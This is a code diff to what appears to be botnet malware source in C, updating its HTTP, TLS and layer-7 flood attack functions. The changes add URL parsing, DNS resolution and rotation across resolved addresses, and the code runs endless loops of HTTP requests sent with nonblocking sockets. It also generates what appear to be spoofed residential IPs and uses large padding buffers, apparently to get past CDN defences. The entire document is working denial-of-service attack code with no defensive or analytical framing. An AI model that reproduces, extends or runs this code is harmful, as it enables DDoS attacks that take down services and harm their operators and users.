@@ -245,12 +245,10 @@ void attack_discord_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_targ
 
 void attack_http_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                        int targs_len, struct attack_option *opts, int opts_len) {
-    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    char *url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
     char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
     char *ua = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);
-
-    if (!domain) domain = "target.com";
-    if (!path) path = "/";
+    int https = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_HTTPS);
 
     static const char *http_uas[] = {
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
@@ -261,13 +259,46 @@ void attack_http_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
         NULL
     };
 
+    char domain[256] = {0};
+    int target_port = 80;
+
+    /* If URL provided, parse it for domain/path/port */
+    if (url && util_strlen(url) > 0) {
+        char url_path[512] = {0};
+        https = util_parse_url(url, domain, sizeof(domain) - 1, url_path, sizeof(url_path) - 1, &target_port);
+        if (util_strlen(url_path) > 0 && (!path || util_strlen(path) == 0)) {
+            path = url_path;
+        }
+    } else if (targs_len > 0) {
+        /* Fall back to target IP as domain if no URL */
+        char *dom_opt = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+        if (dom_opt) {
+            util_strcpy(domain, dom_opt);
+        } else {
+            /* Resolve the target IP to a domain-like string or use target directly */
+            uint8_t *b = (uint8_t *)&targs[0].addr.s_addr;
+            snprintf(domain, sizeof(domain), "%d.%d.%d.%d", b[0], b[1], b[2], b[3]);
+        }
+        if (https) target_port = 443;
+    }
+
+    if (util_strlen(domain) == 0) util_strcpy(domain, "target.com");
+    if (!path || util_strlen(path) == 0) path = "/";
+    if (!ua || util_strlen(ua) == 0) ua = http_uas[rand_next() % 5];
+
+    /* Resolve domain to IPs via DNS */
+    struct resolv_entries *entries = resolv_lookup(domain);
+    if (!entries || entries->count == 0) return;
+
     char req[2048];
     struct sockaddr_in sin = {0};
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(80);
+    sin.sin_port = htons(target_port);
 
-    for (int i = 0; i < targs_len; i++) {
-        sin.sin_addr.s_addr = targs[i].addr.s_addr;
+    int dns_idx = rand_next() % entries->count;
+
+    for (int i = 0; i < entries->count; i++) {
+        sin.sin_addr.s_addr = entries->addrs[(dns_idx + i) % entries->count];
         while (attack_ongoing[0]) {
             const char *use_ua = ua ? ua : http_uas[rand_next() % 5];
             int req_len = snprintf(req, sizeof(req),
@@ -291,6 +322,8 @@ void attack_http_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
             }
         }
     }
+
+    resolv_entries_free(entries);
 }
 
 void attack_pps_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
@@ -318,13 +351,57 @@ void attack_pps_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
 
 void attack_tls_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
+    char *url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
     char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
     char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
     char *ua = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);
 
+    char url_domain[256] = {0};
+    char url_path[512] = {0};
+    int target_port = 443;
+
+    /* If URL provided, parse it */
+    if (url && util_strlen(url) > 0) {
+        util_parse_url(url, url_domain, sizeof(url_domain) - 1, url_path, sizeof(url_path) - 1, &target_port);
+        if (util_strlen(url_domain) > 0) domain = url_domain;
+        if (util_strlen(url_path) > 0 && (!path || util_strlen(path) == 0)) path = url_path;
+    }
+
     if (!domain) domain = "target.com";
-    if (!path) path = "/";
-    if (!ua) ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+    if (!path || util_strlen(path) == 0) path = "/";
+    if (!ua || util_strlen(ua) == 0) ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+
+    /* Resolve domain to IPs via DNS */
+    struct resolv_entries *entries = resolv_lookup(domain);
+    if (!entries || entries->count == 0) {
+        /* Fallback to target IPs if DNS fails */
+        for (int i = 0; i < targs_len; i++) {
+            char req[1024];
+            int req_len = snprintf(req, sizeof(req),
+                "GET %s HTTP/1.1\r\n"
+                "Host: %s\r\n"
+                "User-Agent: %s\r\n"
+                "Accept: */*\r\n"
+                "Connection: keep-alive\r\n\r\n",
+                path, domain, ua);
+
+            struct sockaddr_in sin = {0};
+            sin.sin_family = AF_INET;
+            sin.sin_addr.s_addr = targs[i].addr.s_addr;
+            sin.sin_port = htons(target_port);
+
+            while (attack_ongoing[0]) {
+                int fd = socket(AF_INET, SOCK_STREAM, 0);
+                if (fd == -1) continue;
+                fcntl(fd, F_SETFL, O_NONBLOCK);
+                connect(fd, (struct sockaddr *)&sin, sizeof(sin));
+                send(fd, req, req_len, MSG_NOSIGNAL);
+                usleep(1000);
+                close(fd);
+            }
+        }
+        return;
+    }
 
     char req[1024];
     int req_len = snprintf(req, sizeof(req),
@@ -335,15 +412,14 @@ void attack_tls_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
         "Connection: keep-alive\r\n\r\n",
         path, domain, ua);
 
-    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
-    if (dport == 0) dport = 443;
-
     struct sockaddr_in sin = {0};
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(dport);
+    sin.sin_port = htons(target_port);
 
-    for (int i = 0; i < targs_len; i++) {
-        sin.sin_addr.s_addr = targs[i].addr.s_addr;
+    int dns_idx = rand_next() % entries->count;
+
+    for (int i = 0; i < entries->count; i++) {
+        sin.sin_addr.s_addr = entries->addrs[(dns_idx + i) % entries->count];
         while (attack_ongoing[0]) {
             int fd = socket(AF_INET, SOCK_STREAM, 0);
             if (fd == -1) continue;
@@ -354,6 +430,8 @@ void attack_tls_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             close(fd);
         }
     }
+
+    resolv_entries_free(entries);
 }
 
 void attack_tlsplus_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
@@ -442,15 +520,41 @@ static char cfpad[131072], akpad[8192];
 static int cfinited=0;
 void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
+    char *url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
     char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
     char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
     char *cookies = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_COOKIES);
+    int https = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_HTTPS);
+
+    char url_domain[256] = {0};
+    char url_path[512] = {0};
+    int target_port = 443;
+
+    /* If URL provided, parse it */
+    if (url && util_strlen(url) > 0) {
+        https = util_parse_url(url, url_domain, sizeof(url_domain) - 1, url_path, sizeof(url_path) - 1, &target_port);
+        if (util_strlen(url_domain) > 0) domain = url_domain;
+        if (util_strlen(url_path) > 0 && (!path || util_strlen(path) == 0)) path = url_path;
+    }
+
     if (!domain) domain = "target.com";
-    if (!path) path = "/";
+    if (!path || util_strlen(path) == 0) path = "/";
     if (!cfinited) { memset(cfpad,'B',sizeof(cfpad)-1); cfpad[sizeof(cfpad)-1]=0; memset(akpad,'C',sizeof(akpad)-1); akpad[sizeof(akpad)-1]=0; cfinited=1; }
+
+    /* Resolve domain to IPs via DNS */
+    struct resolv_entries *entries = resolv_lookup(domain);
+    if (!entries || entries->count == 0) return;
+
     char req[16384], rip[16], tpath[256];
     int rt;
-    for (int i = 0; i < targs_len; i++) {
+    struct sockaddr_in sin = {0};
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(target_port);
+
+    int dns_idx = rand_next() % entries->count;
+
+    for (int i = 0; i < entries->count; i++) {
+        sin.sin_addr.s_addr = entries->addrs[(dns_idx + i) % entries->count];
         while (attack_ongoing[0]) {
             gen_resip(rip);
             snprintf(tpath, sizeof(tpath), pthfix[rand_next()%6], path);
@@ -486,10 +590,6 @@ void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *ta
             }
             int fd = socket(AF_INET, SOCK_STREAM, 0);
             if (fd != -1) {
-                struct sockaddr_in sin = {0};
-                sin.sin_family = AF_INET;
-                sin.sin_port = htons(443);
-                sin.sin_addr.s_addr = targs[i].addr.s_addr;
                 fcntl(fd, F_SETFL, O_NONBLOCK);
                 connect(fd, (struct sockaddr *)&sin, sizeof(sin));
                 send(fd, req, strlen(req), MSG_NOSIGNAL);
@@ -498,6 +598,8 @@ void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *ta
             }
         }
     }
+
+    resolv_entries_free(entries);
 }
 
 void attack_dns_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
